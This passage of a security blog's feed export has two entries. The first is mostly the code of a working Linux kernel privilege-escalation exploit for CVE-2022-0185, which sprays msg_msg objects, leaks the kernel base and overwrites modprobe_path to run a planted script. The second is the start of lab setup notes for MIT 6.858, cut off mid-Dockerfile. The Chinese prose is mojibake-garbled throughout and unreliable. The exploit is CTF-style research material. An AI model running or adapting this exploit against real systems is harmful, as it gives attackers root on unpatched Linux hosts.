class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fs_fd = oobWritePrepare();<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <br>             <span class="hljs-string">&quot;arttnbaarttnbaarttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* spray msg_msg into the left half of message queues and seq_files */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in another half of message queues and seq_files..&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* oob write to overwrite m_ts of one msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(m_ts_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(m_ts_buf));<br>    *((<span class="hljs-type">long</span>*) m_ts_buf) = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span>;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, m_ts_buf, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* spray more seq_operations */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray more seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for oob read */</span><span class="hljs-type">size_t</span> data_leak = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for oob reading...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> rcvsz;<br>    <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">if</span> ((rcvsz = peekMsg(msqid[i], buf, <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span> - <span class="hljs-number">8</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] failed to read at %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* normal queue, just ignore */</span><br>        <span class="hljs-keyword">if</span> (rcvsz == (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xfd0</span>) / <span class="hljs-number">8</span>; j++) &#123;<br>            <span class="hljs-comment">//printf(&quot;[----data dump][%d] %p\n&quot;, j, buf[j]);</span><br>            <span class="hljs-keyword">if</span> (buf[j] &gt; kernel_base &amp;&amp; ((buf[j] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x4d0</span>)) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get data leak: %lx\n&quot;</span>, buf[j]);<br>                data_leak = buf[j];<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">if</span> (data_leak == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = data_leak - <span class="hljs-number">0xffffffff813834d0</span>;<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] modprobe_path: %lx\n&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitraryWriteByMsg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid, evil_file_fd;<br>    <span class="hljs-type">char</span> *nearby_page, *evil_page;<br>    <span class="hljs-type">int</span> msg_sz;<br><br>    msg_sz = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                             MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-type">char</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(nearby_page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br>    <br>    exp_fs_fd = oobWritePrepare();<br><br>    writeMsg(msqid, nearby_page - <span class="hljs-number">0xfd0</span> + <span class="hljs-number">8</span>, msg_sz, MSG_TYPE);<br>    <br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM], leak_msqid[MSG_QUEUE_NUM], shell_fd;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-type">uint64_t</span> *data;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">/* register for FUSE */</span><br>    system(<span class="hljs-string">&quot;mkdir -p &quot;</span> EVIL_MOUNT_PATH);<br>    <span class="hljs-keyword">if</span> (fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>                  &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to create FUSE!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* leak kernel base */</span><br>    leakKernelBase();<br><br>    <span class="hljs-comment">/* prepare file for triggering modprobe_path */</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br><br>    <span class="hljs-comment">/* prepare file for fake modprobe_path */</span><br>    shell_fd = open(<span class="hljs-string">&quot;/tmp/evil.sh&quot;</span>, O_RDWR | O_CREAT);<br>    write(shell_fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(shell_fd);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/evil.sh&quot;</span>);<br><br>    <span class="hljs-comment">/* exploit */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> flag_fd;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] trying arbitrary write for no.%d time...\n&quot;</span>, i);<br><br>        arbitraryWriteByMsg();<br>        system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>        flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>        <span class="hljs-keyword">if</span> (flag_fd &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03.æ¼æ´ä¿®å¤"></a>0x03.æ¼æ´ä¿®å¤</h1><p>è¯¥æ¼æ´åœ¨å†…æ ¸ä¸»çº¿çš„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29310e8aa03fcbdb41fc92c521756">è¿™ä¸ª commit</a> å½“ä¸­è¢«ä¿®å¤ï¼Œä¸»è¦å°±æ˜¯å°†å‡æ³•æ¢æˆäº†åŠ æ³•ï¼Œé¿å…äº†æ— ç¬¦å·æ•´å‹ä¸‹æº¢çš„é—®é¢˜ï¼Œç¬”è€…è®¤ä¸ºè¿™ä¸ªä¿®å¤è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="hljs-comment">index b7e43a780a625..24ce12f0db32e 100644</span><br><span class="hljs-comment">--- a/fs/fs_context.c</span><br><span class="hljs-comment">+++ b/fs/fs_context.c</span><br><span class="hljs-meta">@@ -548,7 +548,7 @@</span> static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)<br>       param-&gt;key);<br> &#125;<br> <br><span class="hljs-deletion">-if (len &gt; PAGE_SIZE - 2 - size)</span><br><span class="hljs-addition">+if (size + len + 2 &gt; PAGE_SIZE)</span><br> return invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;);<br> if (strchr(param-&gt;key, &#x27;,&#x27;) ||<br>     (param-&gt;type == fs_value_is_string &amp;&amp;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿˜æ˜¯ mount å¥½&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="ææƒ" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š</title>
    <link href="https://arttnba3.github.io/2022/12/25/EXPR-0X01-MIT_6_858/"/>
    <id>https://arttnba3.github.io/2022/12/25/EXPR-0X01-MIT_6_858/</id>
    <published>2022-12-24T15:15:28.000Z</published>
    <updated>2023-05-31T10:39:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ„Ÿè§‰ä¸å¦‚ CTF 7 å¤©é€Ÿæˆè¯¾ç¨‹â€¦ç”»è´¨â€¦</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="http://css.csail.mit.edu/6.858/2022/">MIT 6.858</a> æ˜¯é¢å‘é«˜å¹´çº§æœ¬ç§‘ç”Ÿä¸ç ”ç©¶ç”Ÿå¼€è®¾çš„ä¸€é—¨å…³äº<strong>è®¡ç®—æœºç³»ç»Ÿå®‰å…¨</strong>ï¼ˆsecure computer securityï¼‰çš„è¯¾ç¨‹ï¼Œå†…å®¹åŒ…æ‹¬å¨èƒæ¨¡å‹ï¼ˆthreat modelsï¼‰ã€å±å®³å®‰å…¨çš„æ”»å‡»ï¼ˆattacks that compromise securityï¼‰ã€å®ç°å®‰å…¨çš„æŠ€æœ¯ï¼ˆtechniques for achieving securityï¼‰</p><p>åœ¨ YouTube ä¸Šæœ‰<a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">å¾€å¹´çš„è¯¾ç¨‹å›æ”¾</a>ï¼Œé…æœ‰è‹±æ–‡å­—å¹•ï¼Œä¸è¿‡ä½œä¸ºä¸€ä¸ªå¹¶éæ˜¯å¯¹å®‰å…¨ä¸€æ— æ‰€çŸ¥çš„å®‰å…¨å°ç™½ï¼Œç¬”è€…ä¸»è¦è¿˜æ˜¯æŒ‘è‡ªå·±ä¸ç†Ÿæ‚‰çš„é‚£ä¸€å—è·³ç€å¬ï¼ˆç¬‘ï¼‰</p><p>è¿™ä¸ªè¯¾ç¨‹ä¸€å…±æœ‰äº”ä¸ª Labï¼š</p><ul><li>Lab1ï¼šç¼“å†²åŒºæº¢å‡ºï¼ˆbuffer overflowï¼‰</li><li>Lab2ï¼šæƒé™åˆ†ç¦»ä¸æœåŠ¡ä¾§æ²™ç®±ï¼ˆprivilege separation and server-side sandboxingï¼‰</li><li>Lab3ï¼šç¬¦å·æ‰§è¡Œï¼ˆsymbolic executionï¼‰</li><li>Lab4ï¼šæµè§ˆå™¨å®‰å…¨ï¼ˆbrowser securityï¼‰</li><li>Lab5ï¼šå®‰å…¨çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆsecure file systemï¼‰</li></ul><p>å‰å››ä¸ª Lab ä¸»è¦æ˜¯åŸºäº MIT å¼€å‘çš„ä¸€ä¸ªå« <code>zookws</code> çš„ web server å®Œæˆçš„</p><h2 id="PRE-ç¯å¢ƒæ­å»º-amp-amp-è¯´æ˜"><a href="#PRE-ç¯å¢ƒæ­å»º-amp-amp-è¯´æ˜" class="headerlink" title="PRE. ç¯å¢ƒæ­å»º &amp;&amp; è¯´æ˜"></a>PRE. ç¯å¢ƒæ­å»º &amp;&amp; è¯´æ˜</h2><p>è¿™é‡Œç»™å‡ºä¸‰ç§æ­å»ºå®éªŒç¯å¢ƒçš„æ–¹å¼</p><h3 id="Method-I-ï¼ˆæ¨èï¼‰ä½¿ç”¨-MIT-æä¾›çš„-VM-é•œåƒ"><a href="#Method-I-ï¼ˆæ¨èï¼‰ä½¿ç”¨-MIT-æä¾›çš„-VM-é•œåƒ" class="headerlink" title="Method I.ï¼ˆæ¨èï¼‰ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒ"></a>Method I.ï¼ˆæ¨èï¼‰ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒ</h3><blockquote><p>å‚è§ <a href="http://css.csail.mit.edu/6.858/2022/labs/lab1.html">Lab 1</a></p></blockquote><p>MIT æä¾›äº†ä¸€ä¸ª  <a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">course VM image</a> ï¼Œå…¶ä¸­æœ‰ç€ä¸€ä¸ª Ubuntu 21.10 çš„ç³»ç»Ÿï¼Œç™»å½•çš„ç”¨æˆ·åä¸º <code>student</code>ï¼Œå¯†ç ä¸º <code>6858</code>ï¼Œä¸‹è½½è§£å‹åæ ¹æ®è‡ªèº«çš„æœ¬åœ°ç¯å¢ƒè¿›è¡Œå¯¹åº”çš„æ“ä½œï¼š</p><ul><li>ä½¿ç”¨ KVM è¿è¡Œï¼šç›´æ¥è¿è¡Œ <strong><code>./6.858-x86_64-v22.sh</code></strong> å³å¯</li><li>ä½¿ç”¨ VMwareè¿è¡Œï¼šæ–°å»ºè™šæ‹Ÿæœºâ†’ç¨åå®‰è£…æ“ä½œç³»ç»Ÿâ†’é€‰æ‹©ç³»ç»Ÿ <code>Linux &gt; Debian 9.x 64-bit</code> â†’ç§»é™¤åŸæœ‰è™šæ‹Ÿç£ç›˜â†’æ·»åŠ æ–°çš„è™šæ‹Ÿç£ç›˜â†’é€‰æ‹©  <code>6.858-x86_64-v22.vmdk</code> å³å¯</li></ul><p>å¯¹äºé X86 æ¶æ„çš„å¤„ç†å™¨ç¯å¢ƒï¼Œ<del>ğŸ‘´çš„å»ºè®®æ˜¯åˆ«åšäº†</del>ï¼Œåœ¨å®éªŒæ‰‹å†Œé‡Œæ¨èå®‰è£… qemu ï¼Œç¬”è€…å°±ä¸æ‘˜æŠ„ä¸€éäº†</p><p><img src="https://s2.loli.net/2022/12/07/bjhUwo5k9q8EiTJ.png" alt="image.png"></p><p>å½“ç„¶æ²¡æœ‰å›¾å½¢ç•Œé¢åªæœ‰ä¸€ä¸ª tty æ¯”è¾ƒéš¾å—ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯æ¨èç”¨ ssh è¿ä¸Šå»åšï¼Œå› ä¸ºè™šæ‹Ÿæœºåœ¨æœ¬åœ°æ‰€ä»¥ç›´æ¥ <code>ip addr show dev eth0</code> æ‰¾åˆ° IP å <code>ssh student@YOUR_IP</code> å°±è¡Œï¼š</p><p><img src="https://s2.loli.net/2022/12/07/MJcV1zZdS5NvnjE.png" alt="image.png"></p><p>ä¹‹åè¿˜æ˜¯æŒ‰æƒ¯ä¾‹æŠŠä»£ç æ‹‰åˆ°æœ¬åœ°ï¼Œå¹¶ä½¿ç”¨ <code>make</code> æ„å»ºä¸€ä¸‹ <code>zookws</code> çœ‹æœ‰æ²¡æœ‰å•¥é—®é¢˜ï¼Œæ²¡æŠ¥é”™å°±ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>zookd</code> è´Ÿè´£æ¥æ”¶ HTTP è¯·æ±‚ï¼Œå…¶ç”± C ç¼–å†™ï¼ŒHTTP ç›¸å…³çš„ä»£ç ä½äº <code>http.c</code> ä¸­ï¼ŒHTTP åè®®ç›¸å…³èµ„æ–™<a href="https://www.garshol.priv.no/download/text/http-tut.html">è§æ­¤å¤„</a></p><p>zookd æœ‰ä¸¤ç§ç‰ˆæœ¬ï¼š</p><ul><li><code>zookd-exstack</code>ï¼šæ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™</li><li><code>zookd-nxstack</code>ï¼šæ ˆä¸å…·æœ‰å¯æ‰§è¡Œæƒé™</li></ul><p>ç”¨ä»¥è¿›è¡Œè¯„åˆ†çš„ <code>zookd</code> ä½äº <code>bin.tar.gz</code> ä¸­</p><p>æ­¤å¤–ï¼ŒMIT è¿˜æä¾›äº†ä¸€ä¸ªç”¨ä»¥æ¸…ç†ç¯å¢ƒçš„ <code>clean-env.sh</code> è„šæœ¬ï¼Œç”¨ä»¥ç¡®ä¿æ¯æ¬¡çš„æ‰§è¡Œç¯å¢ƒéƒ½æ˜¯ç›¸åŒçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿è¡Œ zookdï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd 8080</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½åœ¨æœ¬åœ°çš„ 8080 ç«¯å£è®¿é—®åˆ° zookdï¼Œç›´æ¥è¿›å»å¤§æ¦‚ä¼šæ˜¯è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/KUG3v2uoqjm9nZg.png" alt="image.png"></p><h3 id="Method-II-è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ"><a href="#Method-II-è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ" class="headerlink" title="Method II. è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ"></a>Method II. è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ</h3><p>é¦–å…ˆæ˜¯é…ç¯å¢ƒï¼Œé™¤äº† <code>pwntools</code> æ˜¯ç¬”è€…ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„ä¸€ä¸ªç¼–å†™ exp çš„æ¨¡å—ä»¥å¤–å…¶ä»–éƒ½æ˜¯å®éªŒç¯å¢ƒå¿…é¡»çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo atp-get install -y curl strace lxc-dev</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯æŒ‰æƒ¯ä¾‹æŠŠä»£ç æ‹‰åˆ°æœ¬åœ°ï¼Œå¹¶ä½¿ç”¨ <code>make</code> æ„å»ºä¸€ä¸‹ <code>zookws</code> çœ‹æœ‰æ²¡æœ‰å•¥é—®é¢˜ï¼Œæ²¡æŠ¥é”™å°±ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="Method-III-ä½¿ç”¨-docker-æ­å»ºå®éªŒç¯å¢ƒ"><a href="#Method-III-ä½¿ç”¨-docker-æ­å»ºå®éªŒç¯å¢ƒ" class="headerlink" title="Method III.ä½¿ç”¨ docker æ­å»ºå®éªŒç¯å¢ƒ"></a>Method III.ä½¿ç”¨ docker æ­å»ºå®éªŒç¯å¢ƒ</h3><p>å› ä¸ºè¯„æµ‹ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶éœ€è¦ç”¨è¾ƒé«˜ç‰ˆæœ¬çš„ libcï¼ˆä¾‹å¦‚ç¬”è€…ç”¨çš„å°±æ˜¯ Ubuntu 20.04 with è¿‡æ—¶çš„ libc2.31ï¼‰ï¼ŒåŒæ—¶ä¹Ÿé¿å…æ±¡æŸ“æœ¬åœ°ç¯å¢ƒï¼Œå› æ­¤ä½¿ç”¨ Docker æ¥å®Œæˆå®éªŒä¹Ÿæ˜¯ä¸€ä¸ªéœ€æ±‚é¡¹</p><blockquote><p>Dockerfileï¼Œæ³¨æ„æ›¿æ¢ä¸Šè‡ªå·±çš„å…¬é’¥ï¼Œå¦‚æœæ²¡æœ‰ä»å¤–éƒ¨è¿æ¥å®¹å™¨çš„éœ€æ±‚çš„è¯è¿™ä¸€æ­¥å¯ä»¥è·³è¿‡</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span 